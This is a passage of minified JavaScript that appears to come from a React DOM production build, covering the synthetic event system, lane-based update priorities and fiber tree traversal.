n.dangerouslySetInnerHTML))throw Error(T(61))}if(n.style!=null&&typeof n.style!="object")throw Error(T(62))}}function ba(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var _a=null;function Tl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Sa=null,At=null,Pt=null;function Mo(e){if(e=Gs(e)){if(typeof Sa!="function")throw Error(T(280));var n=e.stateNode;n&&(n=vi(n),Sa(e.stateNode,e.type,n))}}function Du(e){At?Pt?Pt.push(e):Pt=[e]:At=e}function Bu(){if(At){var e=At,n=Pt;if(Pt=At=null,Mo(e),n)for(e=0;e<n.length;e++)Mo(n[e])}}function Fu(e,n){return e(n)}function Uu(){}var Bi=!1;function Vu(e,n,t){if(Bi)return e(n,t);Bi=!0;try{return Fu(e,n,t)}finally{Bi=!1,(At!==null||Pt!==null)&&(Uu(),Bu())}}function bs(e,n){var t=e.stateNode;if(t===null)return null;var s=vi(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(T(231,n,typeof t));return t}var Ea=!1;if(vn)try{var Kt={};Object.defineProperty(Kt,"passive",{get:function(){Ea=!0}}),window.addEventListener("test",Kt,Kt),window.removeEventListener("test",Kt,Kt)}catch{Ea=!1}function Wh(e,n,t,s,r,i,a,l,o){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(u){this.onError(u)}}var ds=!1,Ir=null,zr=!1,Ta=null,$h={onError:function(e){ds=!0,Ir=e}};function Gh(e,n,t,s,r,i,a,l,o){ds=!1,Ir=null,Wh.apply($h,arguments)}function Yh(e,n,t,s,r,i,a,l,o){if(Gh.apply(this,arguments),ds){if(ds){var c=Ir;ds=!1,Ir=null}else throw Error(T(198));zr||(zr=!0,Ta=c)}}function ht(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Hu(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function jo(e){if(ht(e)!==e)throw Error(T(188))}function qh(e){var n=e.alternate;if(!n){if(n=ht(e),n===null)throw Error(T(188));return n!==e?null:e}for(var t=e,s=n;;){var r=t.return;if(r===null)break;var i=r.alternate;if(i===null){if(s=r.return,s!==null){t=s;continue}break}if(r.child===i.child){for(i=r.child;i;){if(i===t)return jo(r),e;if(i===s)return jo(r),n;i=i.sibling}throw Error(T(188))}if(t.return!==s.return)t=r,s=i;else{for(var a=!1,l=r.child;l;){if(l===t){a=!0,t=r,s=i;break}if(l===s){a=!0,s=r,t=i;break}l=l.sibling}if(!a){for(l=i.child;l;){if(l===t){a=!0,t=i,s=r;break}if(l===s){a=!0,s=i,t=r;break}l=l.sibling}if(!a)throw Error(T(189))}}if(t.alternate!==s)throw Error(T(190))}if(t.tag!==3)throw Error(T(188));return t.stateNode.current===t?e:n}function Wu(e){return e=qh(e),e!==null?$u(e):null}function $u(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=$u(e);if(n!==null)return n;e=e.sibling}return null}var Gu=Me.unstable_scheduleCallback,Io=Me.unstable_cancelCallback,Xh=Me.unstable_shouldYield,Kh=Me.unstable_requestPaint,J=Me.unstable_now,Qh=Me.unstable_getCurrentPriorityLevel,Cl=Me.unstable_ImmediatePriority,Yu=Me.unstable_UserBlockingPriority,Dr=Me.unstable_NormalPriority,Zh=Me.unstable_LowPriority,qu=Me.unstable_IdlePriority,hi=null,sn=null;function Jh(e){if(sn&&typeof sn.onCommitFiberRoot=="function")try{sn.onCommitFiberRoot(hi,e,void 0,(e.current.flags&128)===128)}catch{}}var Ke=Math.clz32?Math.clz32:tf,ef=Math.log,nf=Math.LN2;function tf(e){return e>>>=0,e===0?32:31-(ef(e)/nf|0)|0}var tr=64,sr=4194304;function ls(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Br(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,r=e.suspendedLanes,i=e.pingedLanes,a=t&268435455;if(a!==0){var l=a&~r;l!==0?s=ls(l):(i&=a,i!==0&&(s=ls(i)))}else a=t&~r,a!==0?s=ls(a):i!==0&&(s=ls(i));if(s===0)return 0;if(n!==0&&n!==s&&!(n&r)&&(r=s&-s,i=n&-n,r>=i||r===16&&(i&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-Ke(n),r=1<<t,s|=e[t],n&=~r;return s}function sf(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function rf(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,i=e.pendingLanes;0<i;){var a=31-Ke(i),l=1<<a,o=r[a];o===-1?(!(l&t)||l&s)&&(r[a]=sf(l,n)):o<=n&&(e.expiredLanes|=l),i&=~l}}function Ca(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Xu(){var e=tr;return tr<<=1,!(tr&4194240)&&(tr=64),e}function Fi(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Ws(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Ke(n),e[n]=t}function af(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-Ke(t),i=1<<r;n[r]=0,s[r]=-1,e[r]=-1,t&=~i}}function Nl(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-Ke(t),r=1<<s;r&n|e[s]&n&&(e[s]|=n),t&=~r}}var V=0;function Ku(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Qu,Al,Zu,Ju,ep,Na=!1,rr=[],Mn=null,jn=null,In=null,_s=new Map,Ss=new Map,Nn=[],lf="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function zo(e,n){switch(e){case"focusin":case"focusout":Mn=null;break;case"dragenter":case"dragleave":jn=null;break;case"mouseover":case"mouseout":In=null;break;case"pointerover":case"pointerout":_s.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ss.delete(n.pointerId)}}function Qt(e,n,t,s,r,i){return e===null||e.nativeEvent!==i?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:i,targetContainers:[r]},n!==null&&(n=Gs(n),n!==null&&Al(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function of(e,n,t,s,r){switch(n){case"focusin":return Mn=Qt(Mn,e,n,t,s,r),!0;case"dragenter":return jn=Qt(jn,e,n,t,s,r),!0;case"mouseover":return In=Qt(In,e,n,t,s,r),!0;case"pointerover":var i=r.pointerId;return _s.set(i,Qt(_s.get(i)||null,e,n,t,s,r)),!0;case"gotpointercapture":return i=r.pointerId,Ss.set(i,Qt(Ss.get(i)||null,e,n,t,s,r)),!0}return!1}function np(e){var n=Zn(e.target);if(n!==null){var t=ht(n);if(t!==null){if(n=t.tag,n===13){if(n=Hu(t),n!==null){e.blockedOn=n,ep(e.priority,function(){Zu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function xr(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Aa(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);_a=s,t.target.dispatchEvent(s),_a=null}else return n=Gs(t),n!==null&&Al(n),e.blockedOn=t,!1;n.shift()}return!0}function Do(e,n,t){xr(e)&&t.delete(n)}function cf(){Na=!1,Mn!==null&&xr(Mn)&&(Mn=null),jn!==null&&xr(jn)&&(jn=null),In!==null&&xr(In)&&(In=null),_s.forEach(Do),Ss.forEach(Do)}function Zt(e,n){e.blockedOn===n&&(e.blockedOn=null,Na||(Na=!0,Me.unstable_scheduleCallback(Me.unstable_NormalPriority,cf)))}function Es(e){function n(r){return Zt(r,e)}if(0<rr.length){Zt(rr[0],e);for(var t=1;t<rr.length;t++){var s=rr[t];s.blockedOn===e&&(s.blockedOn=null)}}for(Mn!==null&&Zt(Mn,e),jn!==null&&Zt(jn,e),In!==null&&Zt(In,e),_s.forEach(n),Ss.forEach(n),t=0;t<Nn.length;t++)s=Nn[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<Nn.length&&(t=Nn[0],t.blockedOn===null);)np(t),t.blockedOn===null&&Nn.shift()}var Lt=bn.ReactCurrentBatchConfig,Fr=!0;function uf(e,n,t,s){var r=V,i=Lt.transition;Lt.transition=null;try{V=1,Pl(e,n,t,s)}finally{V=r,Lt.transition=i}}function pf(e,n,t,s){var r=V,i=Lt.transition;Lt.transition=null;try{V=4,Pl(e,n,t,s)}finally{V=r,Lt.transition=i}}function Pl(e,n,t,s){if(Fr){var r=Aa(e,n,t,s);if(r===null)Ki(e,n,s,Ur,t),zo(e,s);else if(of(r,e,n,t,s))s.stopPropagation();else if(zo(e,s),n&4&&-1<lf.indexOf(e)){for(;r!==null;){var i=Gs(r);if(i!==null&&Qu(i),i=Aa(e,n,t,s),i===null&&Ki(e,n,s,Ur,t),i===r)break;r=i}r!==null&&s.stopPropagation()}else Ki(e,n,s,null,t)}}var Ur=null;function Aa(e,n,t,s){if(Ur=null,e=Tl(s),e=Zn(e),e!==null)if(n=ht(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Hu(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return Ur=e,null}function tp(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Qh()){case Cl:return 1;case Yu:return 4;case Dr:case Zh:return 16;case qu:return 536870912;default:return 16}default:return 16}}var Pn=null,Ll=null,br=null;function sp(){if(br)return br;var e,n=Ll,t=n.length,s,r="value"in Pn?Pn.value:Pn.textContent,i=r.length;for(e=0;e<t&&n[e]===r[e];e++);var a=t-e;for(s=1;s<=a&&n[t-s]===r[i-s];s++);return br=r.slice(e,1<s?1-s:void 0)}function _r(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function ir(){return!0}function Bo(){return!1}function ze(e){function n(t,s,r,i,a){this._reactName=t,this._targetInst=r,this.type=s,this.nativeEvent=i,this.target=a,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(i):i[l]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?ir:Bo,this.isPropagationStopped=Bo,this}return K(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=ir)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=ir)},persist:function(){},isPersistent:ir}),n}var Gt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Rl=ze(Gt),$s=K({},Gt,{view:0,detail:0}),df=ze($s),Ui,Vi,Jt,fi=K({},$s,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ol,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Jt&&(Jt&&e.type==="mousemove"?(Ui=e.screenX-Jt.screenX,Vi=e.screenY-Jt.screenY):Vi=Ui=0,Jt=e),Ui)},movementY:function(e){return"movementY"in e?e.movementY:Vi}}),Fo=ze(fi),hf=K({},fi,{dataTransfer:0}),ff=ze(hf),mf=K({},$s,{relatedTarget:0}),Hi=ze(mf),gf=K({},Gt,{animationName:0,elapsedTime:0,pseudoElement:0}),vf=ze(gf),yf=K({},Gt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),wf=ze(yf),kf=K({},Gt,{data:0}),Uo=ze(kf),xf={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},bf={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},_f={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Sf(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=_f[e])?!!n[e]:!1}function Ol(){return Sf}var Ef=K({},$s,{key:function(e){if(e.key){var n=xf[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=_r(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?bf[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ol,charCode:function(e){return e.type==="keypress"?_r(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?_r(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Tf=ze(Ef),Cf=K({},fi,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Vo=ze(Cf),Nf=K({},$s,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ol}),Af=ze(Nf),Pf=K({},Gt,{propertyName:0,elapsedTime:0,pseudoElement:0}),Lf=ze(Pf),Rf=K({},fi,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Of=ze(Rf),Mf=[9,13,27,32],Ml=vn&&"CompositionEvent"in window,hs=null;vn&&"documentMode"in document&&(hs=document.documentMode);var jf=vn&&"TextEvent"in window&&!hs,rp=vn&&(!Ml||hs&&8<hs&&11>=hs),Ho=" ",Wo=!1;function ip(e,n){switch(e){case"keyup":return Mf.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ap(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var yt=!1;function If(e,n){switch(e){case"compositionend":return ap(n);case"keypress":return n.which!==32?null:(Wo=!0,Ho);case"textInput":return e=n.data,e===Ho&&Wo?null:e;default:return null}}function zf(e,n){if(yt)return e==="compositionend"||!Ml&&ip(e,n)?(e=sp(),br=Ll=Pn=null,yt=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return rp&&n.locale!=="ko"?null:n.data;default:return null}}var Df={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function $o(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Df[e.type]:n==="textarea"}function lp(e,n,t,s){Du(s),n=Vr(n,"onChange"),0<n.length&&(t=new Rl("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var fs=null,Ts=null;function Bf(e){yp(e,0)}function mi(e){var n=xt(e);if(Lu(n))return e}function Ff(e,n){if(e==="change")return n}var op=!1;if(vn){var Wi;if(vn){var $i="oninput"in document;if(!$i){var Go=document.createElement("div");Go.setAttribute("oninput","return;"),$i=typeof Go.oninput=="function"}Wi=$i}else Wi=!1;op=Wi&&(!document.documentMode||9<document.documentMode)}function Yo(){fs&&(fs.detachEvent("onpropertychange",cp),Ts=fs=null)}function cp(e){if(e.propertyName==="value"&&mi(Ts)){var n=[];lp(n,Ts,e,Tl(e)),Vu(Bf,n)}}function Uf(e,n,t){e==="focusin"?(Yo(),fs=n,Ts=t,fs.attachEvent("onpropertychange",cp)):e==="focusout"&&Yo()}function Vf(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return mi(Ts)}function Hf(e,n){if(e==="click")return mi(n)}function Wf(e,n){if(e==="input"||e==="change")return mi(n)}function $f(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Ze=typeof Object.is=="function"?Object.is:$f;function Cs(e,n){if(Ze(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var r=t[s];if(!pa.call(n,r)||!Ze(e[r],n[r]))return!1}return!0}function qo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Xo(e,n){var t=qo(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=qo(t)}}function up(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?up(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function pp(){for(var e=window,n=jr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=jr(e.document)}return n}function jl(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Gf(e){var n=pp(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&up(t.ownerDocument.documentElement,t)){if(s!==null&&jl(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,i=Math.min(s.start,r);s=s.end===void 0?i:Math.min(s.end,r),!e.extend&&i>s&&(r=s,s=i,i=r),r=Xo(t,i);var a=Xo(t,s);r&&a&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==a.node||e.focusOffset!==a.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),i>s?(e.addRange(n),e.extend(a.node,a.offset)):(n.setEnd(a.node,a.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Yf=vn&&"documentMode"in document&&11>=document.documentMode,wt=null,Pa=null,ms=null,La=!1;function Ko(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;La||wt==null||wt!==jr(s)||(s=wt,"selectionStart"in s&&jl(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),ms&&Cs(ms,s)||(ms=s,s=Vr(Pa,"onSelect"),0<s.length&&(n=new Rl("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=wt)))}function ar(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var kt={animationend:ar("Animation","AnimationEnd"),animationiteration:ar("Animation","AnimationIteration"),animationstart:ar("Animation","AnimationStart"),transitionend:ar("Transition","TransitionEnd")},Gi={},dp={};vn&&(dp=document.createElement("div").style,"AnimationEvent"in window||(delete kt.animationend.animation,delete kt.animationiteration.animation,delete kt.animationstart.animation),"TransitionEvent"in window||delete kt.transitionend.transition);function gi(e){if(Gi[e])return Gi[e];if(!kt[e])return e;var n=kt[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in dp)return Gi[e]=n[t];return e}var hp=gi("animationend"),fp=gi("animationiteration"),mp=gi("animationstart"),gp=gi("transitionend"),vp=new Map,Qo="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function $n(e,n){vp.set(e,n),dt(n,[e])}for(var Yi=0;Yi<Qo.length;Yi++){var qi=Qo[Yi],qf=qi.toLowerCase(),Xf=qi[0].toUpperCase()+qi.slice(1);$n(qf,"on"+Xf)}$n(hp,"onAnimationEnd");$n(fp,"onAnimationIteration");$n(mp,"onAnimationStart");$n("dblclick","onDoubleClick");$n("focusin","onFocus");$n("focusout","onBlur");$n(gp,"onTransitionEnd");It("onMouseEnter",["mouseout","mouseover"]);It("onMouseLeave",["mouseout","mouseover"]);It("onPointerEnter",["pointerout","pointerover"]);It("onPointerLeave",["pointerout","pointerover"]);dt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));dt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));dt("onBeforeInput",["compositionend","keypress","textInput","paste"]);dt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));dt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));dt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var os="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Kf=new Set("cancel close invalid load scroll toggle".split(" ").concat(os));function Zo(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,Yh(s,n,void 0,e),e.currentTarget=null}function yp(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],r=s.event;s=s.listeners;e:{var i=void 0;if(n)for(var a=s.length-1;0<=a;a--){var l=s[a],o=l.instance,c=l.currentTarget;if(l=l.listener,o!==i&&r.isPropagationStopped())break e;Zo(r,l,c),i=o}else for(a=0;a<s.length;a++){if(l=s[a],o=l.instance,c=l.currentTarget,l=l.listener,o!==i&&r.isPropagationStopped())break e;Zo(r,l,c),i=o}}}if(zr)throw e=Ta,zr=!1,Ta=null,e}function $(e,n){var t=n[Ia];t===void 0&&(t=n[Ia]=new Set);var s=e+"__bubble";t.has(s)||(wp(n,e,2,!1),t.add(s))}function Xi(e,n,t){var s=0;n&&(s|=4),wp(t,e,s,n)}var lr="_reactListening"+Math.random().toString(36).slice(2);function Ns(e){if(!e[lr]){e[lr]=!0,Tu.forEach(function(t){t!=="selectionchange"&&(Kf.has(t)||Xi(t,!1,e),Xi(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[lr]||(n[lr]=!0,Xi("selectionchange",!1,n))}}function wp(e,n,t,s){switch(tp(n)){case 1:var r=uf;break;case 4:r=pf;break;default:r=Pl}t=r.bind(null,n,t,e),r=void 0,!Ea||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function Ki(e,n,t,s,r){var i=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var a=s.tag;if(a===3||a===4){var l=s.stateNode.containerInfo;if(l===r||l.nodeType===8&&l.parentNode===r)break;if(a===4)for(a=s.return;a!==null;){var o=a.tag;if((o===3||o===4)&&(o=a.stateNode.containerInfo,o===r||o.nodeType===8&&o.parentNode===r))return;a=a.return}for(;l!==null;){if(a=Zn(l),a===null)return;if(o=a.tag,o===5||o===6){s=i=a;continue e}l=l.parentNode}}s=s.return}Vu(function(){var c=i,u=Tl(t),m=[];e:{var h=vp.get(e);if(h!==void 0){var g=Rl,k=e;switch(e){case"keypress":if(_r(t)===0)break e;case"keydown":case"keyup":g=Tf;break;case"focusin":k="focus",g=Hi;break;case"focusout":k="blur",g=Hi;break;case"beforeblur":case"afterblur":g=Hi;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":g=Fo;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":g=ff;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":g=Af;break;case hp:case fp:case mp:g=vf;break;case gp:g=Lf;break;case"scroll":g=df;break;case"wheel":g=Of;break;case"copy":case"cut":case"paste":g=wf;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":g=Vo}var y=(n&4)!==0,x=!y&&e==="scroll",p=y?h!==null?h+"Capture":null:h;y=[];for(var f=c,v;f!==null;){v=f;var w=v.stateNode;if(v.tag===5&&w!==null&&(v=w,p!==null&&(w=bs(f,p),w!=null&&y.push(As(f,w,v)))),x)break;f=f.return}0<y.length&&(h=new g(h,k,null,t,u),m.push({event:h,listeners:y}))}}if(!(n&7)){e:{if(h=e==="mouseover"||e==="pointerover",g=e==="mouseout"||e==="pointerout",h&&t!==_a&&(k=t.relatedTarget||t.fromElement)&&(Zn(k)||k[yn]))break 